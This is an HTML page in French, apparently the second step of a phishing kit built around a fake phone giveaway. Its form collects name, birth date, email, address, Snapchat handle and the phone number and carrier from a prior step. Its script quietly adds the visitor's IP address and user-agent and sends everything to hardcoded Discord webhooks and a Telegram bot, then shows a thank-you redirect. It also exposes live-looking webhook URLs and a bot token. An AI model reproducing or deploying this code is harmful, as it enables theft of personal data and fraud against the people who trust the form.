<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Formulaire</title>
  <style>
    body {
      background: #2c014d;
      color: #fff;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .c {
      background: rgba(44,1,77,0.85);
      padding: 30px;
      border-radius: 20px;
      width: 360px;
      text-align: center;
      box-shadow: 0 0 15px #9b00ff;
      border: 2px solid #a54ffb;
    }
    input, button {
      width: 100%;
      margin: 8px 0;
      padding: 12px;
      border: 2px solid #a54ffb;
      border-radius: 10px;
      background: transparent;
      color: white;
      font-size: 16px;
      outline: none;
      box-shadow: inset 0 0 8px #9b00ff;
      transition: 0.3s;
    }
    input:focus {
      border-color: #f7b500;
      box-shadow: 0 0 10px #f7b500;
    }
    button {
      background: #f7b500;
      color: #2c014d;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 0 10px #f7b500;
      transition: 0.3s;
    }
    button:hover {
      background: #e0a600;
      box-shadow: 0 0 20px #ffcb3c;
    }
    #msg {
      color: #f88;
      margin-top: 15px;
    }
    label {
      display: block;
      text-align: left;
      margin: 10px 0 5px 0;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="c">
    <h1>Étape 2 : Vos infos</h1>
    <form id="form2">
      <input name="nom" placeholder="Nom" required />
      <input name="prenom" placeholder="Prénom" required />
      <label for="naissance">Date de naissance :</label>
      <input id="naissance" name="naissance" type="date" required />
      <input name="email" type="email" placeholder="Email" required />
      <input name="ville" placeholder="Ville" required />
      <input name="codePostal" placeholder="Code Postal" required />
      <input name="adresse" placeholder="Adresse (facultatif)" />
      <input name="snap" placeholder="Nom Snapchat" required />
      <button type="submit">Valider</button>
    </form>
    <div id="msg"></div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
    const DISCORD_ALT_WEBHOOK_URL = "https://discord.com/api/webhooks/1402568400475131924/EPF82eqz6XawrnId5YB6nCCXs46u5PuccOkYDlKjm6WddiwWJDB6WnOtMWRCvxE-1Eec";
    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6o-VP8_aPOnsT6Qk9tBN2E";
    const TELEGRAM_CHAT_ID = "-1002810249796";

    function detectPhone(ua) {
      ua = ua.toLowerCase();
      if (ua.includes("iphone")) {
        return {
          name: "iPhone 16",
          imageUrl: "https://www.backmarket.fr/cdn-cgi/image/format%3Dauto%2Cquality%3D75%2Cwidth%3D1200/https://d2e6ccujb3mkqf.cloudfront.net/93cf8df0-767b-4323-a17d-0f01f5ce4b04-1_397f83c1-ffc4-4de0-bdfd-bb38a263a770.jpg"
        };
      } else if (ua.includes("android")) {
        return {
          name: "Samsung Galaxy",
          imageUrl: "https://www.backmarket.fr/cdn-cgi/image/format%3Dauto%2Cquality%3D75%2Cwidth%3D1200/https://d2e6ccujb3mkqf.cloudfront.net/3bd83a62-d359-44b0-b61d-481ae6f75710-1_4b547b9e-c5cb-4391-a422-227bab0ac5d2.jpg"
        };
      }
      return null;
    }

    async function sendDiscord(embed, webhookUrl) {
      return fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] }),
      });
    }

    async function sendPhoneImage(webhookUrl, phoneInfo) {
      if (!phoneInfo) return;

      return fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `🔎 **Téléphone détecté : ${phoneInfo.name}**\n📸 ${phoneInfo.imageUrl}`
        }),
      });
    }

    async function sendTelegram(text) {
      return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
          parse_mode: "Markdown",
          disable_web_page_preview: true,
        }),
      });
    }

    async function getIP() {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        return data.ip || "Inconnu";
      } catch {
        return "Inconnu";
      }
    }

    document.getElementById("form2").addEventListener("submit", async (e) => {
      e.preventDefault();
      const msgElem = document.getElementById("msg");
      msgElem.textContent = "Envoi en cours...";

      const formData = new FormData(e.target);
      const ip = await getIP();
      const ua = navigator.userAgent || "Inconnu";
      const phoneInfo = detectPhone(ua);

      const step2 = {
        nom: formData.get("nom"),
        prenom: formData.get("prenom"),
        naissance: formData.get("naissance"),
        email: formData.get("email"),
        ville: formData.get("ville"),
        codePostal: formData.get("codePostal"),
        adresse: formData.get("adresse"),
        snap: formData.get("snap")
      };

      const step1 = JSON.parse(localStorage.getItem("step1") || "{}");
      const operateur = step1.operateur || "Non fourni";
      const telephone = step1.telephone || "Non fourni";

      let webhookToUse = DISCORD_WEBHOOK_URL;
      if (operateur.toLowerCase().includes("bouygues") && Math.random() < 0.5) {
        webhookToUse = DISCORD_ALT_WEBHOOK_URL;
      }

      const discordEmbed = {
        title: "🍭 +1 Entrée 🍭",
        color: 0x9b00ff,
        fields: [
          {
            name: "\u200B",
            value:
              `🍬 Nom         : ${step2.nom}\n` +
              `🍬 Prénom      : ${step2.prenom}\n` +
              `🍬 Naissance   : ${step2.naissance || "Non fournie"}\n` +
              `🍬 Snapchat    : ${step2.snap || "Non fourni"}\n\n` +

              `🏠 Adresse     : ${step2.adresse || "Non fournie"}\n` +
              `🏠 Ville       : ${step2.ville}\n` +
              `🏠 Code Postal : ${step2.codePostal}\n\n` +

              `📧 Email       : ${step2.email}\n` +
              `📞 Téléphone   : ${telephone}\n` +
              `📶 Opérateur   : ${operateur}\n\n` +

              `📟 IP          : ${ip}`
          }
        ],
        timestamp: new Date().toISOString(),
        footer: {
          text: "📥 Données reçues via le formulaire"
        }
      };

      const telegramText =
        `[🎲] INFOS [🎲]\n\n` +
        `🚀 Nom : ${step2.nom}\n` +
        `🚀 Prénom : ${step2.prenom}\n` +
        `🎂 Naissance : ${step2.naissance}\n` +
        `🏠 Adresse : ${step2.adresse || "Non fournie"}\n` +
        `🏠 Ville : ${step2.ville}\n` +
        `🏠 Code Postal : ${step2.codePostal}\n` +
        `📧 E‑Mail : ${step2.email}\n` +
        `👻 Snapchat : ${step2.snap}\n\n` +
        `[📞] Phone [📞]\n` +
        `📶 Opérateur : ${operateur}\n` +
        `📱 Téléphone : ${telephone}\n\n` +
        `[🌐] TIERS [🌐]\n` +
        `📟 Adresse IP : ${ip}\n` +
        `🔎 User-Agent : ${ua}`;

      try {
        await sendDiscord(discordEmbed, webhookToUse);
        await sendPhoneImage(webhookToUse, phoneInfo);
        await sendTelegram(telegramText);

        msgElem.textContent = "Données envoyées avec succès ! Redirection...";
        localStorage.setItem("step2", JSON.stringify(step2));
        setTimeout(() => window.location.href = "merci.html", 1000);
      } catch (err) {
        msgElem.textContent = "Erreur lors de l'envoi.";
        console.error(err);
      }
    });
  </script>
</body>
</html>
